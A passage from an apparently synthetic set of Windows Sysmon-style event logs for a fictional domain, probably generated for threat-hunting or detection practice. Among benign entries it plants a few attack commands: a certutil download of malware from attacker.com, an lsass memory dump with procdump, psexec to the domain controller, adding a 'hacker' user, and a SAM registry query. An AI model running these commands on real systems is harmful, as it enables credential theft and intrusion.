  {
    "EventID": 4624,
    "Computer": "WORKSTATION-03",
    "UserName": "charlie",
    "UtcTime": "2024-03-02T15:59:00Z",
    "EventData": {
      "SubjectUserName": "bob",
      "SubjectDomainName": "CORP"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "bob",
    "UtcTime": "2024-03-06T22:01:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "9055",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=90ac1dcb74de8c3f1e3d80431d7dd3cb419da831b4e6ccdef8918450fc296304"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "administrator",
    "UtcTime": "2024-03-06T10:53:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "5297",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=c6fef018394499ef0e78d71e61b6359d8faee409eb21a88d26038945a69fb755"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "alice",
    "UtcTime": "2024-03-27T06:31:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "5755",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=22579bf56eec32cade967ee1d36523a90de39cb4b75e86a1d2f7e49b19c7e00c"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-04T08:21:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "5953",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b5950e32495a9650a573c65a9f1b0ab8b998ebeb28ff8a30c06b76d51344170d"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "alice",
    "UtcTime": "2024-03-11T08:03:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "6724",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=3e3764bc1628efded0ce14ab369c799f449386cd627a8ec3370cd2dadb32482f"
    }
  },
  {
    "EventID": 3,
    "Computer": "DC-01",
    "UtcTime": "2024-03-27T15:48:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "DestinationIp": "10.0.0.154",
      "DestinationPort": 445,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.193",
      "SourcePort": "49789"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "bob",
    "UtcTime": "2024-03-12T12:58:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "4070",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=07c74e5a5b05ff35e09fd51a594b9c34eac0e81f08728b466084a06cd27536a2"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "administrator",
    "UtcTime": "2024-03-16T09:53:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "6864",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=0f61befc44bfcd079b5dfa419eee3b7efd7581670c4cfd100ad7eebaf84192f1"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "charlie",
    "UtcTime": "2024-03-01T11:08:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\certutil.exe",
      "CommandLine": "certutil.exe -urlcache -split -f http://attacker.com/malware.exe malware.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "7219",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=aa0139902df2db2c92feb5128aef5b2cb0ebe66c36f42bed846650c5a4ccc0c5"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "alice",
    "UtcTime": "2024-03-12T08:15:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "2526",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=26ea9738e43fc6b1eef2c6449aa9e66b692917d14eaba567898f09f696155b8d"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "administrator",
    "UtcTime": "2024-03-26T06:42:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "4350",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=78673a7fa807752e3e6391f203be70480bd91473bf684d6def291bfac0fada39"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "dave",
    "UtcTime": "2024-03-13T01:27:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "5064",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=703f666c50f4211ee293c4b3db06bbee17800456e062ae98656f741e91ecf661"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "charlie",
    "UtcTime": "2024-03-16T05:20:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "4362",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=1108c89a78955766397c6b832be438c305feefe9500071d5c17873d033c690d7"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "charlie",
    "UtcTime": "2024-03-22T02:37:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "4969",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=dfedb81a558aea18b8cb58369afcf6215c2aae413c718b87d1d46da00d25ec80"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "charlie",
    "UtcTime": "2024-03-15T12:39:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "5575",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=3b63eb230ab301d3bea638dbdd113c0c449925c0217dac8c0d3e78e1260861fa"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-12T20:15:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "7363",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=7b837fa3466e6731555dc769c5722ef15ef62f01c07325fe76cc687823ea6f83"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-01T09:54:00Z",
    "EventData": {
      "Image": "C:\\tools\\PsExec64.exe",
      "CommandLine": "psexec64.exe \\\\DC-01 -s cmd.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "4855",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=caf30ef933daef9c877127cece193b058b2eccdfcb4c1ee8976ef3bdde5f8653"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "administrator",
    "UtcTime": "2024-03-14T12:24:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "1983",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=65c156127553c1f151fe6047211e21c2122bc35cd14dc2f1dec20f4104ae7724"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "administrator",
    "UtcTime": "2024-03-14T10:38:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "5970",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=75044d671424b14c018791f6e96c3ad973d15ed16d0caf200fb103a7051dcf1a"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "charlie",
    "UtcTime": "2024-03-22T15:18:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "4714",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=f40306b31cc88545d1d2bc5d53b5388e3a4c458ec02d0160f7fc3eb48578155e"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "bob",
    "UtcTime": "2024-03-20T14:17:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "2944",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=c08868daa5dd76ba12f5815115607c9879301318d71b2d8f9f6b36f3f481e498"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "bob",
    "UtcTime": "2024-03-09T18:56:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "8174",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=94c3a344e8e668f64c861a2a591607675b3345f243d7a018a664e4a9c6241e4e"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "charlie",
    "UtcTime": "2024-03-13T21:16:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "8217",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=6753abf0401ec712a5cb4f52101aae86c9948023ab4a6f5749f185ceae800fd4"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-06",
    "UtcTime": "2024-03-05T19:41:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "DestinationIp": "10.0.0.91",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.233",
      "SourcePort": "54114"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-02",
    "UtcTime": "2024-03-17T05:12:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "DestinationIp": "10.0.0.11",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.12",
      "SourcePort": "61432"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-04",
    "UtcTime": "2024-03-26T07:42:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "DestinationIp": "10.0.0.183",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.180",
      "SourcePort": "52914"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "bob",
    "UtcTime": "2024-03-14T11:44:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "8689",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=0647131609eb6c56b7298cea3e3e808420786430b2ffa6631bda90c260023a4e"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-12T00:19:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "9651",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=4494169bd069c0823aa4cd97488bcc08693c25ed31431e917a25239e6afbcf63"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-09T15:18:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "7479",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=88803d2d2f7a88a6ade4a5b2ca174434fd0ebd3177278f2c5c28b9e4a61f81a2"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "alice",
    "UtcTime": "2024-03-15T03:50:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "3843",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=0514e3542905cba32742c78de81c4e8dce7948b3c61b4e45188b3ce046c7daff"
    }
  },
  {
    "EventID": 4624,
    "Computer": "WORKSTATION-06",
    "UserName": "alice",
    "UtcTime": "2024-03-04T15:37:00Z",
    "EventData": {
      "SubjectUserName": "charlie",
      "SubjectDomainName": "CORP"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "dave",
    "UtcTime": "2024-03-17T11:27:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "1401",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=0b3bc9ce7e7375ed7fc002f759c72777f054f4774aa26bc9095d6bb87286a347"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "alice",
    "UtcTime": "2024-03-05T17:49:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "7909",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=a2904e44c7222fe767c39e2c3656c8fcb3ef8bf9e1ac9c8037e8e068c5f9f601"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "bob",
    "UtcTime": "2024-03-30T10:00:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "6092",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=3685b88a002e2c2125b3388c9786c1b7ea83c0026df310fe21c03654a836b9c7"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "charlie",
    "UtcTime": "2024-03-01T10:21:00Z",
    "EventData": {
      "Image": "C:\\sysinternals\\procdump.exe",
      "CommandLine": "procdump.exe -ma lsass.exe lsass.dmp",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "5645",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b07673efe43ac9b82525f6f658fb74de77580e123625df9f7b645929659fe994"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-12T16:08:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "9312",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=3e021b38129816a471cff06a1e9ed83b119462037174deefc5514a6e53b45b4c"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "charlie",
    "UtcTime": "2024-03-27T02:16:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "9074",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=1e3535f92d950b8b419f62a74c1c7f91e188826fc384397ef3dc9d9d778646f9"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "administrator",
    "UtcTime": "2024-03-07T23:04:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "1107",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b2e9a47b57839c42584e101f4246896f7309dd0c9a7db9d6f388fee53272b833"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "alice",
    "UtcTime": "2024-03-27T12:16:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "2528",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=c109f98cf61555a927a38fa03970c93a4dec76ae94e1da86e8433d3fbba71b9d"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-01T09:00:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\net.exe",
      "CommandLine": "net user hacker P@ssw0rd! /add",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "7742",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=1b2dc266021c73f2fa373415156cbf9d63bd4d617c333fe306a87869152938b0"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "administrator",
    "UtcTime": "2024-03-26T22:09:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "5242",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=e57c3c1c440537c44b67b9cfe37bce3497884a42687fc5a7396f0b0cf046ff66"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "dave",
    "UtcTime": "2024-03-12T06:55:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "3745",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=4ab04a4a888477f50c48744f3aeb0f028541e5d7f3e89ddd758510ad77da7b73"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "bob",
    "UtcTime": "2024-03-26T03:05:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "2133",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=afa259769c52be680867de92b4952f37db8d9fe6e0230d1032fce2cfe7656052"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-08T09:54:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "7924",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=ce029ac8c24174a1ebbe7141b319a4c4412c1c3dda2275272d3ffa34828c9c4e"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-01T10:40:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\reg.exe",
      "CommandLine": "reg query HKLM\\SAM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "4332",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=eb69920a2d32fc6bd6cb01dcac1fee4e4824fa52dc02cb8b1eecb106006647c4"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-28T09:02:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "2823",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=222cd9f1aba8e37542cae7c92cd39e50739c8ab5ee72f1fc324be5e3bc80d033"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "dave",
    "UtcTime": "2024-03-30T01:14:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "9481",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=d39a4f4a859c6890334c8d93816864101e86f27372f47d732e4a9cc7a9c26d3e"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "alice",
    "UtcTime": "2024-03-15T10:01:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "5077",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=9a3581970e0ae12113e4203df63be1a3b753c55d3e47cc6e128b50db3f346dc4"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-01T23:27:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "2426",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=726f5ad18f3ecd3457e7ff32448a12e77b25a511355ceef24da07130d3303cac"
    }
  },
  {
    "EventID": 4624,
    "Computer": "WORKSTATION-05",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-22T17:43:00Z",
    "EventData": {
      "SubjectUserName": "SYSTEM",
      "SubjectDomainName": "CORP"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "bob",
    "UtcTime": "2024-03-22T16:32:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "6553",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=904dbb6e11087fa689bd9ca4d7a548fd5beac97bcc56a8ca26dab3e66dfe98d5"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-08",
    "UtcTime": "2024-03-05T11:53:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "DestinationIp": "10.0.0.17",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.240",
      "SourcePort": "62551"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-02",
    "UtcTime": "2024-03-12T23:26:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "DestinationIp": "10.0.0.126",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.254",
      "SourcePort": "51098"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "bob",
    "UtcTime": "2024-03-20T10:26:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "9175",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=d8738a1d378b72181cb20ab77cfd73124c9ba1f513a7f4dbb0d184ba21ed05cb"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "administrator",
    "UtcTime": "2024-03-14T02:52:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "9040",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=be61c5eff9a13ca405ed7fd00e42fdd30a75a9f6dd3c8f738f04a62b18c079c2"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "bob",
    "UtcTime": "2024-03-03T17:37:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "7158",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=d006745c1bd22ec028a4c9b0fa89421c83383f69ecba8bfa3ee3fb222395dac3"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
